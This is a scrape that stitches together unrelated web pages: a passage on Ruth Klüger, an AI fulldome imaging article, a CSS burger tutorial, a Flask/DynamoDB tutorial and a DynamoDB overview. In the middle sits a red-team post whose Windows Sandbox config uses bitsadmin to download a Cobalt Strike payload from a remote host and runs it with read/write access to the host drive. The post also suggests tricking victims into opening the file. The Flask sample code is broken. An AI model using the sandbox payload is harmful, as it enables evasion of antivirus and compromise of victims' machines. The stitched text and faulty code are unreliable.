<p>As Klüger’s former colleague <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">Gail Hart reflects</a>, “I think she was a little bit too hard on those who, say, visited Holocaust memorials and Holocaust museums because she said that, you know, they were trying to admire themselves for hating the Nazis.” In <em>Still Alive </em>(as once <a href="https://www.lrb.co.uk/the-paper/v37/n03/slavoj-zizek/in-the-grey-zone">quoted by Slavoj Žižek</a>), Klüger recounts a conversation with German graduate students in Göttingen:</p>



<blockquote><p>One reports how in Jerusalem he made the acquaintance of an old Hungarian Jew who was a survivor of Auschwitz, and yet this man cursed the Arabs and held them all in contempt. How can someone who comes from Auschwitz talk like that? the German asks. I get into the act and argue, perhaps more hotly than need be. What did he expect? Auschwitz was no instructional institution…You learned nothing there, and least of all humanity and tolerance. Absolutely nothing good came out of the concentration camps, I hear myself saying, with my voice rising, and [the student] expects catharsis, purgation, the sort of thing you go to the theatre for? They were the most useless, pointless establishments imaginable. That is the one thing to remember about them if you know nothing else. (<em>Still Alive, </em>65)</p></blockquote>



<p>Klüger refuses to cast herself as a saint on account of her experience (unlike the <a href="https://time.com/4392426/ronald-lauder-elie-wiesel-holocaust/">canonized</a> but also <a href="https://www.tikkun.org/a-variety-of-perspectives-on-elie-wiesel">criticized</a> figure of Elie Wiesel). On the contrary, she even recounts a disturbing incident from the postwar years, while she waited in vain for her father and brother to return from the camps, in which she accidentally killed a little dog by forgetting to turn off the gas in the kitchen where he slept. “Of course I was mortified the next morning when I found his lifeless body and was despondent for days. Accident or symptom? And if the latter, symptom of what?” (<em>Still Alive</em>, 158). This fundamental recognition of moral fallibility led fellow Auschwitz survivor Primo Levi to coin the term “the grey zone” to describe how the camps generated <em>amorality</em>, not morality among victims. Yet while Levi similarly characterized Auschwitz as a <a href="https://books.google.com/books/about/The_Black_Hole_of_Auschwitz.html?id=VxbSTfGI638C">“Black Hole,”</a> he also, in sharp contrast to Klüger, called it his <a href="https://books.google.com/books?id=Kf3FAAAAQBAJ&amp;pg=PA34&amp;dq=%E2%80%9CAuschwitz+had+been+his+true+university.%E2%80%9D&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwi7mdLrkpztAhWhFVkFHVRWCmYQ6AEwAHoECAAQAg#v=onepage&amp;q=%E2%80%9CAuschwitz%20had%20been%20his%20true%20university.%E2%80%9D&amp;f=false">“true university”</a> for understanding human nature.</p>



<p><a href="https://www.nybooks.com/articles/2002/11/07/surviving/">Gabriele Annan</a> spoke for many when she called Klüger “merciless” and “outspoken to the point of aggressiveness”: “She also resents all views on the Holocaust that do not tally exactly with her own, and gets indignant about everyone who criticizes her….Levi told a similar story without making one feel so hectored.” <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">Speaking</a> before Angela Merkel and the German Bundestag on Holocaust Remembrance Day in 2016, Klüger <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">called</a> her own approach “bitter and aggressive,” yet also positively connected her experience with the plight of other groups, praising the “heroic” act of welcoming refugees from war-torn Syria. (She similarly <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">opposed</a> inhumane treatment of asylum-seekers at the U.S.–Mexico border.) Hart, her former colleague, reflects of Klüger, “She is a very direct interrogator. She doesn’t have any of these conciliatory mechanisms that most women have. And she seeks argument. And at first I found that a little bit off-putting and I kind of avoided her.” As Klüger admitted herself, “Damn right. I <em>am</em> hard to satisfy” (<em>Still Alive</em>, 184).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="news-content-html">
		    <div id="fddb_field_content"><p>In recent times the use of artificial intelligence, machine learning, GAN's and algorithms in artistic applications has been on the rise. There are many AI tools available today to assist creators at various points in the production process, whether it's streamlining normally tedious tasks with precision, or generating completely new stunning pieces of digital art.</p>
<p>Our question:&nbsp; <strong>Can AI generate 360° images&nbsp;</strong><strong>formatted for fulldome?</strong> (domemasters)</p>
<p>Our answer:&nbsp; <strong>Yes!&nbsp;</strong>&nbsp;(..kind of)</p>
<p>Tools/software: <strong>Kodak SP3604K, Runway ML, StyleGAN2 on Google Colab.&nbsp;&nbsp;</strong></p>
<p>Machine learning is an area of research within the field of artificial intelligence (AI). For this experiment, we used <a href="https://runwayml.com/">RunwayML</a>, a platform for training your own models. The term model refers to the result of training a machine learning algorithm with a dataset. A machine learning algorithm find patterns within the data and develops its own rules for how to represent—or model—those patterns to perform a specific task. These rules are not designed by humans; they are learned from the data on which the model was trained.</p>
<p>People build models in different programming languages, with different frameworks, and for different purposes, such as to recognize spam email, classify objects, edit images and video, and capture motion. <strong>In our case</strong>, <strong><em>we want to train a model that generates images of architectural facades that respect the geometric attributes and perspective of the domemaster format.</em></strong></p>
<p>Here are the results:&nbsp;<strong>AI urban environments, domemaster below.&nbsp;</strong></p>
<p><iframe src="https://www.youtube.com/embed/A9Sa4ADKgZs" frameborder="0" width="560" height="315" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>We rendered 20+ minutes of fully AI-generated, morphing 360° urban environments with some interesting results:</p>
<ul>
<li>the geometry works!&nbsp;</li>
<li>the perspective works!</li>
<li>our AI domemaster has 230°+ fov since our dataset was shot with the SP3604K</li>
<li>full flexibility of latent walk render, speed and frames using StyleGAN2 in Colab (tutorial below)</li>
<li><em>limitation</em>: training resolution at 512x512 or 1024x1024 means rendered images must be upscaled before being usable in the dome (topaz AI gigapixel worked well).&nbsp; This can create unwanted artifacts in the image.</li>
</ul>
<p><strong>So how is this possible?</strong></p>
<p><strong>First step:</strong> We need an image dataset.&nbsp; We created an image dataset of 3000 fisheye images shot in downtown Montreal which we used to train our AI model.&nbsp;RunwayML makes training very easy: all you need to do is supply your own dataset and determine the number of steps that the algorithm should take to learn the features. During each step, the model learns a little bit more about the features in your dataset.</p>
<p>The time it takes to train a model depends on a combination of many factors, including but not limited to the type of machine learning algorithm (there are algorithms of varying complexity for working with images, words, or sounds) and the number of training steps.</p>
<p>RunwayML greatly reduces the amount of time needed to train your own generative image model by using using a technique called&nbsp;<a href="https://en.wikipedia.org/wiki/Transfer_learning" target="_blank" rel="noopener noreferrer">Transfer Learning</a>. With this technique, an existing pre-trained model called&nbsp;<a href="https://open-app.runwayml.com/?model=runway/StyleGAN" target="_blank" rel="noopener noreferrer">StyleGAN</a>&nbsp;is retrained on your dataset. StyleGAN was trained on a massive amount of images (70,000!), and Transfer Learning leverages all of the&nbsp;<a href="https://en.wikipedia.org/wiki/Feature_(computer_vision)" target="_blank" rel="noopener noreferrer">image features</a>&nbsp;it learned from the original data to speed up the process of learning features in your image dataset. Not only does this greatly reduce training time, but it also reduces the number of images that you need to train your own model.&nbsp;</p>
<p><strong><span>Training steps progress animation:</span></strong></p>

<p><strong>Second step:&nbsp;</strong>After a few hours our model has finished training, great!&nbsp; During training, your model learns to produce new images that look like the ones in your dataset. When training is complete, the model will generate a seemingly infinite number of synthetic images that appear as if they came from the dataset itself. The space of all-new possible images that your model can create is called the <em>latent space</em>, which you can explore when you run your model. RunwayML allows you to run the model directly in its UI (at a cost), or to download the model as a <strong>.pkl.&nbsp;&nbsp;</strong>Training already comes at a cost, and we want the flexibility of exploring the latent space ourselves, so we download the model and run it remotely on Google Colab with StyleGan2.&nbsp; The following tutorial explains the exact workflow with links in the description.</p>

<p><strong>Conclusion:</strong> Promising results for artists wishing to explore the possibilities of AI-generated 360° environments in the dome.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        <div>
            
<p>I enjoy challenging myself on some weird programming ideas. It's a good way to have fun and to learn new things. This time the challenge was to draw a cheeseburger in CSS using a single empty div.</p>
<p>After a lot of trials and errors, I ended up with this.</p>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>That's probably not the best looking burger ever. However I've been super impressed that it was actually possible to draw something as complex as this with a single div.</p>
<p>In this article we are going to make this cheeseburger, step by step. </p>
<h2>The HTML</h2>
<p>The HTML is very short: a charset, a title, a link to the CSS file, and a single div. </p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Cheesburger&lt;/title&gt;
    &lt;link rel="stylesheet" href="style.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="burger"&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>That's it! Now we will focus our attention on the style.css file. </p>
<h2>The CSS</h2>
<p>The most basic CSS for our burger may look like this.</p>
<pre><code>.burger {
  /* Contains all the parts of the burger */
  /* Bun, cheese, meat, lettuce, and sesame seeds */
}</code></pre>
<p>But that's too limited, we won't be able to fit a whole burger inside a single selector. To find more space, we should use the <code>:before</code> and <code>:after</code> pseudo elements. </p>
<pre><code>.burger {
  /* The cheese, meat, and lettuce */
}

.burger:before {
  /* The bun */
}

.burger:after {
  /* The sesame seeds */
}</code></pre>
<p>That might not seem much, but that will be enough for our purpose. </p>
<h2>The bun</h2>
<p>The bun is made of 2 parts: the top bun and the bottom bun. So we have to find a way to draw 2 different shapes in a single CSS selector, which is not that complicated.</p>
<p>We start by drawing 2 rectangles using the <code>border</code> property. </p>
<pre><code>.burger:before {
  content: ""; 
  display: block;

  /* Space between the buns */
  width: 400px;
  height: 55px;

  /* Top bun */
  border-top: 80px solid #f5b230;

  /* Bottom bun */
  border-bottom: 50px solid #f5b230;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/1.png" alt=""></p>
<p>Then we use <code>border-radius</code> to curve the bread nicely.</p>
<pre><code>.burger:before {
  /* Same code as previously */
  content: ""; 
  display: block;
  width: 400px;
  height: 55px;
  border-top: 80px solid #f5b230;
  border-bottom: 50px solid #f5b230;

  /* New line */
  border-radius: 30% 30% 20% 20%; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2.png" alt=""></p>
<h2>The ingredients</h2>
<p>Next, we will add the main burger ingredients: cheese, meat, and lettuce. This time it's 3 shapes that we have to fit in a single CSS selector. </p>
<p>Let's focus on the meat for now.</p>
<pre><code>.burger {
  /* Size */
  width: 380px;
  height: 40px;

  /* Color and shape */
  background-color: #681f24;
  border-radius: 15px; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2a.png" alt=""></p>
<p>Well, that's not great. We have some meat, but it's not in the correct position. Unfortunately we can't use <code>margin</code> or <code>padding</code> to fix that, since it would move the whole burger and not just the steak.</p>
<p>Let's try something different: drawing the meat with a <code>box-shadow</code>.</p>
<pre><code>.burger {
  /* Same as previously */
  /* We just removed the background color */
  width: 380px;
  height: 40px;
  border-radius: 15px;

  /* New line */ 
  /* The parameters: margin-left, margin-top, color */
  box-shadow: 10px 85px #681f24; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/3.png" alt=""></p>
<p>That works! However we face another issue: how can we  add the cheese and the lettuce in the same CSS selector? To answer that we need to realize 2 things:</p>
<ul>
<li>The meat, the cheese, and the lettuce may have the same shape as long as their color is different.</li>
<li>In CSS it's possible to use as many box shadows as we want.</li>
</ul>
<p>So... we simply add more box shadows! </p>
<pre><code>.burger {
  /* Same code as before */
  width: 380px;
  height: 40px;
  border-radius: 15px; 

  /* Updated box shadow */
  box-shadow: 
      10px 50px #fddb28, /* Cheese */
      10px 85px #681f24, /* Meat */
      10px 120px #82af15; /* Lettuce */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/4.png" alt=""></p>
<p>Note that the shadows' order is important, since the first one will have a higher z-index and will appear in front of the others. </p>
<h2>The sesame seeds</h2>
<p>Our burger is taking shape, but it currently looks a lot like a hot dog. We should fix that by adding some sesame seeds to the top bun. </p>
<p>First we draw a single sesame seed with a <code>box-shadow</code>.</p>
<pre><code>.burger:after {
  content: "";
  display: block;

  /* Size and shape */
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Position and color */
  box-shadow: 100px -165px #ffffff;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5b.png" alt=""></p>
<p>Then we duplicate it by using many box shadows.</p>
<pre><code>.burger:after {
  /* Keep same code as before */
  content: "";
  display: block;
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Add new box-shadow */
  box-shadow: 
      /* Top row */
      100px -165px #ffffff,
      160px -165px #ffffff,
      230px -165px #ffffff,
      290px -165px #ffffff,

      /* Bottom row */
      60px -135px #ffffff,
      125px -135px #ffffff,
      190px -135px #ffffff,
      255px -135px #ffffff,
      330px -135px #ffffff;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5.png" alt=""></p>
<h2>Better cheese</h2>
<p>It would be nice if we could make our cheese look more like cheese. For example by showing one of the corners of the cheese slice. This means drawing a new shape (a yellow triangle) even though we already use all our CSS selectors.</p>
<p>If we look carefully at our code, we will notice that there's one thing we haven't really used so far: the <code>content</code> property. Let's see what happens when we add the character <code>▾</code> in it.</p>
<pre><code>.burger:before {
  /* Change the content property */
  content: "▾";

  /* Color and Size of the ▾ */
  color: #fddb28;
  font-size: 120px;

  /* Then keep everything else the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5c.png" alt=""></p>
<p>We do get a new shape displayed, but it's in the wrong position. And once again we cannot use <code>margin</code> or <code>padding</code> to solve that. </p>
<p>But with some CSS tricks, we will make this work. </p>
<pre><code>.burger:before {
  /* Add 8 spaces before the triangle */
  content: "        ▾";

  /* Actually display the spaces in the "content" */ 
  white-space: pre;

  /* Vertically position the ▾ */
  line-height: 25px;

  /* Then keep everything the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>And we finished our cheeseburger!</p>
<h2>Bonus</h2>
<p>When emailing a friend about my challenge, she replied with this clever answer.</p>
<pre><code>.burger:before {
  content: "🍔";
  font-size: 100px;
}</code></pre>
<p>That's a lot less CSS for a better looking result. </p>
<h2>Conclusion</h2>
<p>I'm really impressed with what I managed to achieve with a single div and some CSS. Of course using SVG would have made more sense, but where's the fun in that?</p>

<p>Weaponizing Windows Sandbox To Bypass Defender</p>
<p><a href="">●</a> 02 Dec 2020</p>

<h2 id="introduction">Introduction</h2>
<p>I’ve not posted on here since May, as I’ve been busy with (well, life in general) projects and whatnot. This short blog post may be useful for a Red Team by living-of-the-land for the execution of payloads on a machine where Windows Sandbox can be enabled; Windows Sandbox is designed to work this way - no exploitation of anything is covered in this post. With this technique in terms of executing within a VM, we don’t need to load an external ISO onto the machine, as all of this is handled by the sandbox. From my visibility, <code>.wsb</code> was not inspected or blacklisted on any major EDR or AV.</p>
<p>At the tail end of last year, Microsoft introduced a new feature named Windows Sandbox (WSB for short). Windows Sandbox allows you to quickly, within 15s, create a disposable Hyper-V based Virtual Machine with all of the qualities a familiar VM would have such as clipboard sharing, mapping directories etc. The sandbox is also the underlay for Microsoft Defender Application Guard (WDAG), for dynamic analysis on Hyper-V enabled hosts and can be enabled on any Windows 10 Pro or Enterprise machine - making this a perfect as a living off the land technique.</p>
<p>The tl;dr of this technique is to craft a .wsb that can be executed on an endpoint, which mounts the user’s file-system, allowing us to execute the implant inside a hidden VM and bypass any AV/EDR that’s on the host. The WSB configuration also seems to be bypassing Windows Defender on the host where it’s executed. It’s not incredibly complicated but could prove useful in an engagement.</p>
<h2 id="technique">Technique</h2>
<p>To enable the sandbox on the host machine, we can simply run the following in PowerShell:</p>
<pre><code>Enable-WindowsOptionalFeature -FeatureName "Containers-DisposableClientVM" -All -Online
</code></pre>
<p>As the interactive sandbox is mainly designed for an end-user to deem if a file is malicious or not, Windows Defender is not enabled by default for obvious reasons. We can observe this below.</p>
<pre><code>PS C:\Users\WDAGUtilityAccount&gt; Get-MpComputerStatus
Get-MpComputerStatus : Provider load failure
At line:1 char:1
+ Get-MpComputerStatus
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (MSFT_MpComputerStatus:ROOT\Microsoft\...pComputerStatus) [Get-MpComputerS
   tatus], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041013,Get-MpComputerStatus
</code></pre>
<p>The user can either launch a default instance of the sandbox or create a .wsb file with specific parameters. These parameters are defined by Microsoft <a href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/windows-sandbox-config-files/ba-p/354902">here</a>. The WSB extension is associated with Windows Sandbox and will launch a new instance with your defined values. For example, the below configuration will run <code>cmd</code> and <code>ping</code> upon boot.</p>
<pre><code>&lt;LogonCommand&gt; 
  &lt;Command&gt;
    cmd.exe /c ping 8.8.8.8
  &lt;/Command&gt; 
&lt;/LogonCommand&gt;
</code></pre>
<p>We can also specify a folder or drive to map to, in which the guest inherits the file permissions. We can read/write to the folder:</p>
<pre><code>&lt;MappedFolders&gt; 
  &lt;MappedFolder&gt;  
    &lt;HostFolder&gt;C:\&lt;/HostFolder&gt;  
    &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\C_Mount&lt;/SandboxFolder&gt;  
    &lt;ReadOnly&gt;false&lt;/ReadOnly&gt;  
  &lt;/MappedFolder&gt;
</code></pre>
<p>So, if we craft a .wsb configuration file, with folders we want to access, along with a logon command we can execute an implant inside of the Windows Sandbox with full read/write access to the file-system with one click. Below is a crafted proof-of-concept WSB configuration, where the root drive (<code>C:\</code>) is mapped to <code>C:\Users\WDAGUtilityAccount\UserFiles</code>.&nbsp; On execution of the WSB file, a Cobalt Strike payload is executed from %APPDATA% inside the VM with full access to the root file system. The WSB file is also <strong>undetected on the host</strong>.</p>
<pre><code>&lt;Configuration&gt; 
  &lt;MappedFolders&gt; 
    &lt;MappedFolder&gt; 
      &lt;HostFolder&gt;C:\&lt;/HostFolder&gt; 
      &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\UserFiles&lt;/SandboxFolder&gt; 
      &lt;ReadOnly&gt;false&lt;/ReadOnly&gt; 
    &lt;/MappedFolder&gt; 
  &lt;/MappedFolders&gt; 
  &lt;LogonCommand&gt; 
    &lt;Command&gt;C:\Users\ping 127.0.0.1 -n 3&gt;null&amp;bitsadmin /transfer myjob /download /priority high http://192.168.0.4/cs_wsb_test.bin "%APPDATA%\cs.exe"&gt;nul&amp;start %APPDATA%\cs.exe&lt;/Command&gt; 
  &lt;/LogonCommand&gt; 
&lt;/Configuration&gt;
</code></pre>
<p>The command could be anything - I just used the one above as a placeholder. The <code>.wsb</code> extension is also registered to be handled by <code>WindowsSandbox.exe</code> - giving room to a social engineering attack encouraging a victim to execute it where it is enabled.</p>
<h2 id="conclusion">Conclusion</h2>
<p>A similar technique has been used by the infamous Maze and Ragnar locker threat actors in recent times; however, they have installed 3rd party virtualisation suites such as VMWare &amp; VBox - using Windows Sandbox bypasses the requirement for this software to be installed. To complement this technique, I created a simple Go program to find drives automatically and mounted network shares that can include as a mapped folder, to then generate a WSB based on this. This can be found <a href="https://github.com/LloydLabs/wsb-construct">here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Unlike Django, Flask is not directly tie-up with any database. So we can use Flask with either SQL and No-SQL. And that makes the Flask framework superior among other web frameworks and most suitable for serverless architecture. In this article, I’m going to explain how to code the flask application and database as DynamoDB and deploy to AWS Lambda.</p><h2 id="introduction">Introduction</h2><p>The application architecture will look like this, First I’ve created the file resources.py where I initiate the boto3 client. And I’ve created a models.py file that holds all the class references. And finally, I have the JSON file to create the DynamoDB table automatically from the script.</p><h2 id="table-json">Table JSON</h2><p>You can also create the table directly in the AWS console but my local development
I’m using DynamoDB local instance so I’ve to reply on other technique to create the
the table in my local and one of the methods is using the awscli command.</p><pre><code>{
    "TableName": "User",
    "KeySchema": [{ "AttributeName": "email", "KeyType": "HASH" }],
    "AttributeDefinitions": [{ "AttributeName": "email", "AttributeType": "S" }],
    "ProvisionedThroughput": { "ReadCapacityUnits": 5, "WriteCapacityUnits": 5 }
  }
</code></pre><p>Once you have the JSON file you can run the below command to create the table.</p><pre><code>aws dynamodb create-table --cli-input-json file:////actual_file_path/models/create-user.json --endpoint-url http://localhost:8000
</code></pre><p>You can remove the <code>--endpoint-url</code> if you’re creating the table in AWS console.</p><h2 id="models">Models</h2><p>I’ve created the class reference for each table. One of the benefits of having this Python object is to deal with DynamoDB response in your template and code.</p><p>Also, for authentication purposes, I’ve used the flask login so that you can create authentication with this code.</p><pre><code>from flask_login import UserMixin

class User(UserMixin):
    def __init__(self):
          self.email = None
           self.first_name = None
           self.last_name = None

   def get_id(self):
        return self.VE


    def init_user(self, response):
        self.email = response["email"]["S"]

        if "first_name" in response:
            self.first_name = response["first_name"]["S"]

        return self
</code></pre><h2 id="resources">Resources</h2><p>In order to make the CRUD operation very easy i’ve created the prepare function.
That takes the args, kwargs and turn into the dict. This dict will be useful in
update operation.</p><p>And the get function nothing but make the DynamoDB call and convert into the
class object. And then you can use this class object in your template. Also you can
pass the class object to jinja2 template and use it in the template as you like.</p><pre><code>import boto3

dynamo_client = boto3.client("dynamodb")
dynamodb_resource = boto3.resource("dynamodb")
</code></pre><pre><code>def prepare_user(email, first_name=None, last_name):
    return {"email": email, "first_name": first_name, "last_name": last_name}
</code></pre><p>Main purpose of this prepare user is to create the dict that directly use in CRUD operation.</p><pre><code>def get_user(email):
    response = dynamo_client.get_item(Key={"email": {"S": email}}, TableName="User")

    if "Item" in response:
        return User().init_user(response["Item"])

    return None
</code></pre><p>you can also create the update_user and delete_user function and use it in your code.</p><h2 id="conclusion">Conclusion</h2><p>What we have seen is how to incorporate DynamoDB in our flask based project. First the
resources and the creation of the table from JSON file and then have the model class based
python reference and then finally the CRUD operation function.</p></div><p>This article published under

<p>Web-based applications face scaling due to the growth of users along with the increasing complexity of data traffic.</p>
<p>Along with the modern complexity of business comes the need to process data faster and more robustly. Because of this, standard transactional databases aren’t always the best fit.</p>
<p>Instead, databases <a href="https://www.theseattledataguy.com/dynamodb-vs-hadoop-vs-mongodb/" target="_blank" rel="noopener noreferrer" data-href="https://www.theseattledataguy.com/dynamodb-vs-hadoop-vs-mongodb/">such as DynamoDB</a> have been designed to manage the new influx of data. DynamoDB is an Amazon Web Services database system that supports data structures and key-valued cloud services. It allows users the benefit of auto-scaling, in-memory caching, backup and restore options for all their internet-scale applications using DynamoDB.</p>
<p>But why would you want to use DynamoDB and what are some examples of use cases?</p>
<p>In this post, we’ll cover just that. We will layout the benefits of using DynamoDB, and outline some use cases as well as some of the challenges.</p>
<section>

<div>
<div>
<h3>Benefits of DynamoDB for Operations</h3>
<p>First, let’s discuss why DynamoDB can be useful.</p>
<figure><img src="https://cdn-images-1.medium.com/max/1600/0*1m1LAQYbGgEV4Rmu" data-image-id="0*1m1LAQYbGgEV4Rmu" data-width="700" data-height="300"></figure>
<h4><strong>Performance and scalability</strong></h4>
<p>Those who have worked in the IT industry know that scaling databases can both be difficult and risky. DynamoDB gives you the ability to auto-scale by tracking how close your usage is to the upper bounds. This can allow your system to adjust according to the amount of data traffic, helping you to avoid issues with performance while reducing costs.</p>
<h4><strong>Access to control&nbsp;rules</strong></h4>
<p>As data gets more specific and personal, it becomes more important to have effective access control. You want to easily apply access control to the right people without creating bottlenecks in other people’s workflow. The fine-grained access control of DynamoDB allows the table owner to gain a higher level of control over the data in the table.</p>
<h4><strong>Persistence of event stream&nbsp;data</strong></h4>
<p>DynamoDB streams allow developers to receive and update item-level data before and after changes in that data. This is because DynamoDB streams provide a time-ordered sequence of changes made to the data within the last 24 hours. With streams, you can easily use the API to make changes to a full-text search data store such as Elasticsearch, push incremental backups to Amazon S3, or maintain an up-to-date read-cache.</p>
<h4><strong>Time To&nbsp;Live</strong></h4>
<p>TTL or Time-to-Live is a process that allows you to set timestamps for deleting expired data from your tables. As soon as the timestamp expires, the data that is marked to expire is then deleted from the table. Through this functionality, developers can keep track of expired data and delete it automatically. This process also helps in reducing storage and cutting the costs of manual data deletion work.</p>
<h4><strong>Storage of inconsistent schema&nbsp;items</strong></h4>
<p>If your data objects are required to be stored in inconsistent schemas, DynamoDB can manage that. Since DynamoDB is a NoSQL data model, it handles less structured data more efficiently than a relational data model, which is why it’s easier to address query volumes and offers high performance queries for item storage in inconsistent schemas.</p>
<h4><strong>Automatic data managemen</strong>t</h4>
<p>DynamoDB constantly creates a backup of your data for safety purposes which allows owners to have data saved on the cloud.</p>

<div>
<h3>5 Use Cases for DynamoDB</h3>
<p>One of the reasons people don’t use DynamoDB is because they are uncertain whether it is a good fit for their project. We wanted to share some examples where companies are using DynamoDB to help manage the larger influx and of data at high speeds.</p>
<h4><strong>Duolingo</strong></h4>
<p>Duolingo, an online learning site, uses DynamoDB to store approximately 31 billion data objects on their web server.</p>
<p>This startup has around 18 million monthly users who perform around six billion exercises using the Duolingo app.</p>
<p>Because their application has 24,000 read units per second and 3,300 write units per second<a href="https://aws.amazon.com/solutions/case-studies/duolingo-case-study-dynamodb/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/duolingo-case-study-dynamodb/"> DynamoDB ended up being the right fit for them</a>. The team had very little knowledge about DevOps and managing large scale systems when they started. Because of Duolingo’s global usage and need for personalized data, DynamoDB is the only database that has been able to meet their needs, both in terms of data storage and DevOps.</p>
<p>Also, the fact that DynamoDB scales automatically meant that this small startup did not need to use their developers to manually adjust the size. DynamoDB has simplified as well as scaled to meet their needs.</p>
<h4><strong>Major League Baseball&nbsp;(MLB)</strong></h4>
<p>There’s a lot we take for granted when we watch a game of baseball.</p>
<p>For example, did you know there’s a Doppler radar system that sits behind home plate, sampling the ball position 2,000 times a second? Or that there are two stereoscopic imaging devices, usually positioned above the third-base line, that sample the positions of players on the field 30 times a second?</p>
<p>All these data transactions require a system that is fast on both reads and writes. The MLB uses a combination of AWS components to help process all this data. <a href="https://aws.amazon.com/solutions/case-studies/major-league-baseball-mlbam/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/major-league-baseball-mlbam/">DynamoDB plays a key role</a> in ensuring queries are fast and reliable.</p>
<h4><strong>Hess Corporation</strong></h4>
<p>Hess Corporation, a well-known energy company, has been working on the exploration and production of natural gas and crude oil.</p>
<p>This business requires strategizing different financial planning which impacts management on the whole. To streamline their business processes, Hess turned towards DynamoDB by shifting its E&amp;P (Energy Exploration and Production) project onto AWS.</p>
<p>Now DynamoDB has helped the company in separating potential buyers’ data from business systems. Moreover, the <a href="https://www.slideshare.net/AmazonWebServices/how-hess-has-continued-to-optimize-the-aws-cloud-after-migrating-ent218-reinvent-2017" target="_blank" rel="noopener noreferrer" data-href="https://www.slideshare.net/AmazonWebServices/how-hess-has-continued-to-optimize-the-aws-cloud-after-migrating-ent218-reinvent-2017">operational infrastructure of DynamoDB</a> helps them to handle data effectively and get optimized and well-managed results.</p>
<h4><strong>GE Healthcare</strong></h4>
<p>GE is well-known for medical imaging equipment that helps in diagnostics through radiopharmaceuticals and imaging agents.</p>
<p>The company has used DynamoDB to increase customer value, enabled by cloud access, storage, and computation.</p>
<p>The <a href="https://www.youtube.com/watch?v=4EQchAPyroE" target="_blank" rel="noopener noreferrer" data-href="https://www.youtube.com/watch?v=4EQchAPyroE">GE Health Cloud</a> provides a single portal for healthcare professionals all over the US to process and share images of patient cases. This is a great advantage for diagnostics. Clinicians can improve treatments through access to this healthcare data,</p>
<h4><strong>Docomo</strong></h4>
<p>NTT Docomo, a popular mobile phone operating company, has built a reputation for its voice recognition services, which need the best performance and capacity.</p>
<p>To cater to these requirements, Docomo turned towards DynamoDB which has helped the company scale towards better performance.</p>
<p>With their growing customer base,<a href="https://aws.amazon.com/solutions/case-studies/ntt-docomo/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/ntt-docomo/"> Docomo has brought a voice recognition architecture into use, which helps them perform better even during traffic spikes</a>.</p>
<p>Along with all these cases, advertising technology companies also rely heavily on Amazon DynamoDB to store their marketing data of different types.</p>
<p>This data includes user events, user profiles, visited links and clicks. Sometimes, this data also includes ad targeting, attribution, and real-time bidding.</p>
<p>Thus, ad tech companies require low latency, high request rate and high performance without having to invest heavily in database operations.</p>
<p>This is why companies turn towards DynamoDB. It not only offers high performance but also, with its data replication option, allows companies to deploy their real-time applications in more than one geographical location.</p>
<p>However, despite all the benefits DynamoDB isn’t always the easiest database to use when it comes to analytics.</p>

<h3>Challenges of Analyzing DynamoDB Operational Data</h3>
<p>DynamoDB’s focus is on providing fast data transactions for applications. What makes DynamoDB fast on a transaction level can actually hinder it from the perspective of analyzing data. Here are a few of the major roadblocks you will run into once you start analyzing data in DynamoDB.</p>
<h4><strong>Online Analytical Processing (OLAP)</strong></h4>
<p>Online analytical processing and data warehousing systems usually require huge amounts of aggregating, as well as the joining of dimensional tables, which are provided in a normalized or relational view of data.</p>
<p>This is not possible in the case of DynamoDB since it’s a non-relational database that works better with NoSQL formatted data tables. Besides, the general data structures for analytics aren’t always well supported in key-value databases. In turn, it can be harder to get to data and run large computations.</p>
<h4><strong>Querying and&nbsp;SQL</strong></h4>
<p>Along with OLAP processes being difficult to run on DynamoDB, due to the focus of DynamoDB being operational, DynamoDB does not interface with SQL.</p>
<p>This is a key issue because most analytical talent is familiar with SQL and not DynamoDB queries. In turn, this makes it difficult to interact with the data and ask critical analytical questions.</p>
<p>The consequences of this can be the requirement to hire developers solely to extract the data, which is expensive, or being unable to analyze the data at all.</p>
<h4><strong>Indexing is expensive</strong></h4>
<p>Another qualm when it comes to analytics is processing large data sets quickly. Often this can be alleviated with indexes.</p>
